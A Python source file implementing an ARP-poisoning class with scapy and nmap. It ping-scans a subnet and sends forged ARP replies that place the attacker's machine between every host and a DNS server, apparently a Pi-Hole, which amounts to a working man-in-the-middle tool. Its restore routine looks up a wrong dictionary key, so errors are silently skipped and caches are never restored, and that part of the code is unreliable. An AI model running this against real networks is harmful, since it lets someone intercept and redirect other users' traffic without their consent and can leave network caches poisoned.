from scapy.all import *
import nmap
from configuration import *


class Arp:
    nm = nmap.PortScanner()
    dns_mac = ''
    mac_attacker = ''
    first_call = True
    # Refresh list of hosts
    counter = 0
    conf = Configuration()

    def __init__(self):
        return

    def poison(self, mac_attacker, mac_victim, ip_victim, ip_to_spoof):
        # Create false ARP packet
        arp = Ether()/ARP()
        arp[Ether].src = mac_attacker
        arp[ARP].hwsrc = mac_attacker
        arp[ARP].psrc = ip_to_spoof
        arp[ARP].hwdst = mac_victim
        arp[ARP].pdst = ip_victim

        sendp(arp, verbose=False)

    def restore(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac): # TODO Rewrite method on L2
        # Broadcast 3 times machine B's correct MAC address
        send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_b_mac), count=3, verbose=False)
        # Broadcast 3 times machine A's correct MAC address
        send(ARP(op=2, pdst=machine_b_ip, psrc=machine_a_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_a_mac), count=3, verbose=False)

    def get_hosts(self, ip):
        if self.first_call:
            print("Obtaining list of alive hosts...")

        # Refresh list of hosts periodically
        if self.counter > self.conf.getARPhostsRefreshDelay():
            self.nm.scan(ip, arguments='-sP')
            self.counter = 0

        # Check if scan already occurred
        elif not self.nm.all_hosts():
            # Ping scan to get all alive hosts
            self.nm.scan(ip, arguments='-sP')

        if self.first_call:
            print("Done! (" + str(len(self.nm.all_hosts())) + " found)")

    def poison_all(self, ip_range, dns_ip, dns_mac):
        if not self.mac_attacker:
            self.get_nic_mac()

        self.get_hosts(ip_range)
        for host in self.nm.all_hosts():
            if not host == str(socket.gethostbyname(socket.gethostname())): # Don't poison yourself
                try:
                    # Poison DNS server
                    self.poison(self.mac_attacker, dns_mac, dns_ip, host)
                    # Poison device
                    self.poison(self.mac_attacker, self.nm[host]['addresses']['mac'], host, dns_ip)
                    if self.first_call:
                        print("Poisoned " + host)
                except KeyError:
                    continue
        # Return true if poisoning was successful and increment counter
        self.counter = self.counter + 1
        if self.first_call:
            self.first_call = False
        return True

    def restore_all(self, ip_range, dns_ip, dns_mac):
        self.get_hosts(ip_range)
        for host in self.nm.all_hosts():
            try:
                self.restore(host, self.nm[host]['address']['mac'], dns_ip, dns_mac)
            except KeyError:
                continue

    # Get Pi-Hole's MAC address
    def get_dns_mac(self, ip):
        if self.dns_mac is '':
            scanner = nmap.PortScanner()
            scanner.scan(ip, arguments='-sP')
            self.dns_mac = scanner[ip]['addresses']['mac']

        return self.dns_mac

    # Get own MAC address (attacker's) based on NIC defined in conf
    def get_nic_mac(self):
        network_interface = self.conf.getNetworkInterface()
        try:
            self.mac_attacker = get_if_hwaddr(network_interface)
            return
        except Exception as e:
            sys.exit("Error, the network interface specified in the configuration was not found.")
